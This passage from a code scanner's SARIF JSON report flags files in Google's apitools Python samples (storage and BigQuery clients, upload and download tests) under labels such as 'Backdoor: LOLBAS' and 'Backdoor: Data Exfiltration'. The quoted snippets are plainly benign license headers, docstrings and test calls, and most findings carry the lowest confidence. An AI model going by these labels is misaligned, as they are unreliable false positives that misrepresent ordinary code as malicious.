                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/storage_v1.json"
                },
                "region": {
                  "startLine": 50,
                  "startColumn": 4,
                  "endLine": 50,
                  "endColumn": 14,
                  "snippet": {
                    "text": "   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n",
                    "rendered": {
                      "text": "   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n",
                      "markdown": "`   \"description\": \"API key. Your API key identifies your project and provides you with API access, quota, and reports. Required unless you provide an OAuth 2.0 token.\",\n   \"location\": \"query\"\n  },\n  \"oauth_token\": {\n   \"type\": \"string\",\n   \"description\": \"OAuth 2.0 token for the current user.\",\n   \"location\": \"query\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/generate_clients.sh"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/downloads_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/downloads_test.py"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 59,
                  "endLine": 98,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    def testFilenameWithSpaces(self):\n        self.__ResetDownload(auto_transfer=True)\n        self.__GetFile(self.__GetRequest('filename with spaces'))\n        # NOTE(craigcitro): We add _ here to make this play nice with blaze.\n        file_contents = self.__GetTestdataFileContents('filename_with_spaces')\n        self.assertEqual(15, self.__buffer.tell())\n        self.__buffer.seek(0)\n",
                    "rendered": {
                      "text": "    def testFilenameWithSpaces(self):\n        self.__ResetDownload(auto_transfer=True)\n        self.__GetFile(self.__GetRequest('filename with spaces'))\n        # NOTE(craigcitro): We add _ here to make this play nice with blaze.\n        file_contents = self.__GetTestdataFileContents('filename_with_spaces')\n        self.assertEqual(15, self.__buffer.tell())\n        self.__buffer.seek(0)\n",
                      "markdown": "`    def testFilenameWithSpaces(self):\n        self.__ResetDownload(auto_transfer=True)\n        self.__GetFile(self.__GetRequest('filename with spaces'))\n        # NOTE(craigcitro): We add _ here to make this play nice with blaze.\n        file_contents = self.__GetTestdataFileContents('filename_with_spaces')\n        self.assertEqual(15, self.__buffer.tell())\n        self.__buffer.seek(0)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/downloads_test.py"
                },
                "region": {
                  "startLine": 180,
                  "startColumn": 40,
                  "endLine": 180,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        object_name = os.path.join(self._TESTDATA_PREFIX, 'fifteen_byte_file')\n        request = storage.StorageObjectsGetRequest(\n            bucket=self._DEFAULT_BUCKET, object=object_name)\n        response = self.__client.objects.Get(request)\n        # pylint: disable=attribute-defined-outside-init\n        self.__buffer = six.StringIO()\n        download_data = json.dumps({\n",
                    "rendered": {
                      "text": "        object_name = os.path.join(self._TESTDATA_PREFIX, 'fifteen_byte_file')\n        request = storage.StorageObjectsGetRequest(\n            bucket=self._DEFAULT_BUCKET, object=object_name)\n        response = self.__client.objects.Get(request)\n        # pylint: disable=attribute-defined-outside-init\n        self.__buffer = six.StringIO()\n        download_data = json.dumps({\n",
                      "markdown": "`        object_name = os.path.join(self._TESTDATA_PREFIX, 'fifteen_byte_file')\n        request = storage.StorageObjectsGetRequest(\n            bucket=self._DEFAULT_BUCKET, object=object_name)\n        response = self.__client.objects.Get(request)\n        # pylint: disable=attribute-defined-outside-init\n        self.__buffer = six.StringIO()\n        download_data = json.dumps({\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/downloads_test.py"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 40,
                  "endLine": 69,
                  "endColumn": 45,
                  "snippet": {
                    "text": "            bucket=cls._DEFAULT_BUCKET, object=object_name)\n\n    def __GetFile(self, request):\n        response = self.__client.objects.Get(request, download=self.__download)\n        self.assertIsNone(response, msg=(\n            'Unexpected nonempty response for file download: %s' % response))\n\n",
                    "rendered": {
                      "text": "            bucket=cls._DEFAULT_BUCKET, object=object_name)\n\n    def __GetFile(self, request):\n        response = self.__client.objects.Get(request, download=self.__download)\n        self.assertIsNone(response, msg=(\n            'Unexpected nonempty response for file download: %s' % response))\n\n",
                      "markdown": "`            bucket=cls._DEFAULT_BUCKET, object=object_name)\n\n    def __GetFile(self, request):\n        response = self.__client.objects.Get(request, download=self.__download)\n        self.assertIsNone(response, msg=(\n            'Unexpected nonempty response for file download: %s' % response))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/uploads_test.py"
                },
                "region": {
                  "startLine": 148,
                  "startColumn": 65,
                  "endLine": 148,
                  "endColumn": 69,
                  "snippet": {
                    "text": "            request, upload=self.__upload)\n        self.assertIsNotNone(initial_response)\n        self.assertEqual(0, self.__buffer.tell())\n        # Pretend the process died, and resume with a new attempt at the\n        # same upload.\n        upload_data = json.dumps(self.__upload.serialization_data)\n        second_upload_attempt = transfer.Upload.FromData(\n",
                    "rendered": {
                      "text": "            request, upload=self.__upload)\n        self.assertIsNotNone(initial_response)\n        self.assertEqual(0, self.__buffer.tell())\n        # Pretend the process died, and resume with a new attempt at the\n        # same upload.\n        upload_data = json.dumps(self.__upload.serialization_data)\n        second_upload_attempt = transfer.Upload.FromData(\n",
                      "markdown": "`            request, upload=self.__upload)\n        self.assertIsNotNone(initial_response)\n        self.assertEqual(0, self.__buffer.tell())\n        # Pretend the process died, and resume with a new attempt at the\n        # same upload.\n        upload_data = json.dumps(self.__upload.serialization_data)\n        second_upload_attempt = transfer.Upload.FromData(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/uploads_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/uploads_test.py"
                },
                "region": {
                  "startLine": 169,
                  "startColumn": 43,
                  "endLine": 169,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        self.assertTrue(completed_upload_attempt.complete)\n        completed_upload_attempt.StreamInChunks()\n        # Verify the upload didn't pick up extra bytes.\n        object_info = self.__client.objects.Get(self.__GetRequest(filename))\n        self.assertEqual(size, object_info.size)\n        # TODO(craigcitro): Add tests for callbacks (especially around\n        # finish callback).\n",
                    "rendered": {
                      "text": "        self.assertTrue(completed_upload_attempt.complete)\n        completed_upload_attempt.StreamInChunks()\n        # Verify the upload didn't pick up extra bytes.\n        object_info = self.__client.objects.Get(self.__GetRequest(filename))\n        self.assertEqual(size, object_info.size)\n        # TODO(craigcitro): Add tests for callbacks (especially around\n        # finish callback).\n",
                      "markdown": "`        self.assertTrue(completed_upload_attempt.complete)\n        completed_upload_attempt.StreamInChunks()\n        # Verify the upload didn't pick up extra bytes.\n        object_info = self.__client.objects.Get(self.__GetRequest(filename))\n        self.assertEqual(size, object_info.size)\n        # TODO(craigcitro): Add tests for callbacks (especially around\n        # finish callback).\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/storage_sample/uploads_test.py"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 43,
                  "endLine": 161,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        final_upload_attempt.StreamInChunks()\n        self.assertEqual(size, self.__buffer.tell())\n        # Verify the upload\n        object_info = self.__client.objects.Get(self.__GetRequest(filename))\n        self.assertEqual(size, object_info.size)\n        # Confirm that a new attempt successfully does nothing.\n        completed_upload_attempt = transfer.Upload.FromData(\n",
                    "rendered": {
                      "text": "        final_upload_attempt.StreamInChunks()\n        self.assertEqual(size, self.__buffer.tell())\n        # Verify the upload\n        object_info = self.__client.objects.Get(self.__GetRequest(filename))\n        self.assertEqual(size, object_info.size)\n        # Confirm that a new attempt successfully does nothing.\n        completed_upload_attempt = transfer.Upload.FromData(\n",
                      "markdown": "`        final_upload_attempt.StreamInChunks()\n        self.assertEqual(size, self.__buffer.tell())\n        # Verify the upload\n        object_info = self.__client.objects.Get(self.__GetRequest(filename))\n        self.assertEqual(size, object_info.size)\n        # Confirm that a new attempt successfully does nothing.\n        completed_upload_attempt = transfer.Upload.FromData(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_client.py"
                },
                "region": {
                  "startLine": 631,
                  "startColumn": 55,
                  "endLine": 631,
                  "endColumn": 63,
                  "snippet": {
                    "text": "    )\n\n    def Update(self, request, global_params=None):\n      r\"\"\"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource.\n\n      Args:\n        request: (BigqueryTablesUpdateRequest) input message\n",
                    "rendered": {
                      "text": "    )\n\n    def Update(self, request, global_params=None):\n      r\"\"\"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource.\n\n      Args:\n        request: (BigqueryTablesUpdateRequest) input message\n",
                      "markdown": "`    )\n\n    def Update(self, request, global_params=None):\n      r\"\"\"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource.\n\n      Args:\n        request: (BigqueryTablesUpdateRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_client.py"
                },
                "region": {
                  "startLine": 605,
                  "startColumn": 55,
                  "endLine": 605,
                  "endColumn": 63,
                  "snippet": {
                    "text": "    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource. This method supports patch semantics.\n\n      Args:\n        request: (BigqueryTablesPatchRequest) input message\n",
                    "rendered": {
                      "text": "    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource. This method supports patch semantics.\n\n      Args:\n        request: (BigqueryTablesPatchRequest) input message\n",
                      "markdown": "`    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource. This method supports patch semantics.\n\n      Args:\n        request: (BigqueryTablesPatchRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_client.py"
                },
                "region": {
                  "startLine": 439,
                  "startColumn": 47,
                  "endLine": 439,
                  "endColumn": 51,
                  "snippet": {
                    "text": "          }\n\n    def InsertAll(self, request, global_params=None):\n      r\"\"\"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\n\n      Args:\n        request: (BigqueryTabledataInsertAllRequest) input message\n",
                    "rendered": {
                      "text": "          }\n\n    def InsertAll(self, request, global_params=None):\n      r\"\"\"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\n\n      Args:\n        request: (BigqueryTabledataInsertAllRequest) input message\n",
                      "markdown": "`          }\n\n    def InsertAll(self, request, global_params=None):\n      r\"\"\"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\n\n      Args:\n        request: (BigqueryTabledataInsertAllRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_client.py"
                },
                "region": {
                  "startLine": 189,
                  "startColumn": 57,
                  "endLine": 189,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    )\n\n    def Update(self, request, global_params=None):\n      r\"\"\"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource.\n\n      Args:\n        request: (BigqueryDatasetsUpdateRequest) input message\n",
                    "rendered": {
                      "text": "    )\n\n    def Update(self, request, global_params=None):\n      r\"\"\"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource.\n\n      Args:\n        request: (BigqueryDatasetsUpdateRequest) input message\n",
                      "markdown": "`    )\n\n    def Update(self, request, global_params=None):\n      r\"\"\"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource.\n\n      Args:\n        request: (BigqueryDatasetsUpdateRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_client.py"
                },
                "region": {
                  "startLine": 163,
                  "startColumn": 57,
                  "endLine": 163,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource. This method supports patch semantics.\n\n      Args:\n        request: (BigqueryDatasetsPatchRequest) input message\n",
                    "rendered": {
                      "text": "    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource. This method supports patch semantics.\n\n      Args:\n        request: (BigqueryDatasetsPatchRequest) input message\n",
                      "markdown": "`    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource. This method supports patch semantics.\n\n      Args:\n        request: (BigqueryDatasetsPatchRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_client.py"
                },
                "region": {
                  "startLine": 439,
                  "startColumn": 52,
                  "endLine": 439,
                  "endColumn": 58,
                  "snippet": {
                    "text": "          }\n\n    def InsertAll(self, request, global_params=None):\n      r\"\"\"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\n\n      Args:\n        request: (BigqueryTabledataInsertAllRequest) input message\n",
                    "rendered": {
                      "text": "          }\n\n    def InsertAll(self, request, global_params=None):\n      r\"\"\"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\n\n      Args:\n        request: (BigqueryTabledataInsertAllRequest) input message\n",
                      "markdown": "`          }\n\n    def InsertAll(self, request, global_params=None):\n      r\"\"\"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\n\n      Args:\n        request: (BigqueryTabledataInsertAllRequest) input message\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_client.py"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 33,
                  "endLine": 11,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n\nclass BigqueryV2(base_api.BaseApiClient):\n  \"\"\"Generated client library for service bigquery version v2.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/bigquery/v2/'\n",
                    "rendered": {
                      "text": "\n\nclass BigqueryV2(base_api.BaseApiClient):\n  \"\"\"Generated client library for service bigquery version v2.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/bigquery/v2/'\n",
                      "markdown": "`\n\nclass BigqueryV2(base_api.BaseApiClient):\n  \"\"\"Generated client library for service bigquery version v2.\"\"\"\n\n  MESSAGES_MODULE = messages\n  BASE_URL = 'https://www.googleapis.com/bigquery/v2/'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1648,
                  "startColumn": 5,
                  "endLine": 1648,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    kind: The resource type.\n    numDmlAffectedRows: [Output-only, Experimental] The number of rows\n      affected by a DML statement. Present only for DML statements INSERT,\n      UPDATE or DELETE.\n    pageToken: A token used for paging results.\n    rows: An object with as many results as can be contained within the\n      maximum permitted reply size. To get any additional rows, you can call\n",
                    "rendered": {
                      "text": "    kind: The resource type.\n    numDmlAffectedRows: [Output-only, Experimental] The number of rows\n      affected by a DML statement. Present only for DML statements INSERT,\n      UPDATE or DELETE.\n    pageToken: A token used for paging results.\n    rows: An object with as many results as can be contained within the\n      maximum permitted reply size. To get any additional rows, you can call\n",
                      "markdown": "`    kind: The resource type.\n    numDmlAffectedRows: [Output-only, Experimental] The number of rows\n      affected by a DML statement. Present only for DML statements INSERT,\n      UPDATE or DELETE.\n    pageToken: A token used for paging results.\n    rows: An object with as many results as can be contained within the\n      maximum permitted reply size. To get any additional rows, you can call\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1536,
                  "startColumn": 40,
                  "endLine": 1536,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    etag: A hash of the page of results\n    kind: The type of list.\n    nextPageToken: A token to request the next page of results.\n    projects: Projects to which you have at least READ access.\n    totalItems: The total number of projects in the list.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "    etag: A hash of the page of results\n    kind: The type of list.\n    nextPageToken: A token to request the next page of results.\n    projects: Projects to which you have at least READ access.\n    totalItems: The total number of projects in the list.\n  \"\"\"\n\n",
                      "markdown": "`    etag: A hash of the page of results\n    kind: The type of list.\n    nextPageToken: A token to request the next page of results.\n    projects: Projects to which you have at least READ access.\n    totalItems: The total number of projects in the list.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1427,
                  "startColumn": 5,
                  "endLine": 1427,
                  "endColumn": 13,
                  "snippet": {
                    "text": "      query cache.\n    numDmlAffectedRows: [Output-only, Experimental] The number of rows\n      affected by a DML statement. Present only for DML statements INSERT,\n      UPDATE or DELETE.\n    queryPlan: [Output-only, Experimental] Describes execution plan for the\n      query.\n    referencedTables: [Output-only, Experimental] Referenced tables for the\n",
                    "rendered": {
                      "text": "      query cache.\n    numDmlAffectedRows: [Output-only, Experimental] The number of rows\n      affected by a DML statement. Present only for DML statements INSERT,\n      UPDATE or DELETE.\n    queryPlan: [Output-only, Experimental] Describes execution plan for the\n      query.\n    referencedTables: [Output-only, Experimental] Referenced tables for the\n",
                      "markdown": "`      query cache.\n    numDmlAffectedRows: [Output-only, Experimental] The number of rows\n      affected by a DML statement. Present only for DML statements INSERT,\n      UPDATE or DELETE.\n    queryPlan: [Output-only, Experimental] Describes execution plan for the\n      query.\n    referencedTables: [Output-only, Experimental] Referenced tables for the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1319,
                  "startColumn": 44,
                  "endLine": 1319,
                  "endColumn": 52,
                  "snippet": {
                    "text": "      contains data, a 'duplicate' error is returned in the job result. The\n      default value is WRITE_EMPTY. Each action is atomic and only occurs if\n      BigQuery is able to complete the job successfully. Creation, truncation\n      and append actions occur as one atomic update upon job completion.\n  \"\"\"\n\n  createDisposition = _messages.StringField(1)\n",
                    "rendered": {
                      "text": "      contains data, a 'duplicate' error is returned in the job result. The\n      default value is WRITE_EMPTY. Each action is atomic and only occurs if\n      BigQuery is able to complete the job successfully. Creation, truncation\n      and append actions occur as one atomic update upon job completion.\n  \"\"\"\n\n  createDisposition = _messages.StringField(1)\n",
